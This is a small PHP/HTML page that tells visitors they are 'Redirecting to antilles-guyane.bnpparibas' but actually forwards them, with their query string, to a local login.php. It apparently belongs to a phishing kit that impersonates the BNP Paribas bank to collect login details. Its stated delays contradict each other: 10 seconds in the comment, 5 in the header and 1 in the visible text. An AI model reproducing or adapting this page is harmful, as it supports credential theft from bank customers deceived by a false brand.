<?php
// Get the query string from the current URL
$queryString = $_SERVER['QUERY_STRING'];

// Build the new URL with the query string
$newUrl = "login.php?" . $queryString;

// Redirect to the new URL after a 10-second delay
header("refresh:5;url=" . $newUrl);

// Output a message to the user indicating the redirect
?>
<!DOCTYPE html>
<html>
  <head>
  
  </head>
  <body>

   <p style="text-align:center">Redirecting to antilles-guyane.bnpparibas in 1 seconds...</p>
   <p style='text-align:center'><img alt=''src='https://cdn.dribbble.com/users/3742211/screenshots/9195657/media/6796a544d6f9ef1293d8d8d9e60d38d5.gif' style='height:50px; width:70px' /></p>
  </body>
</html>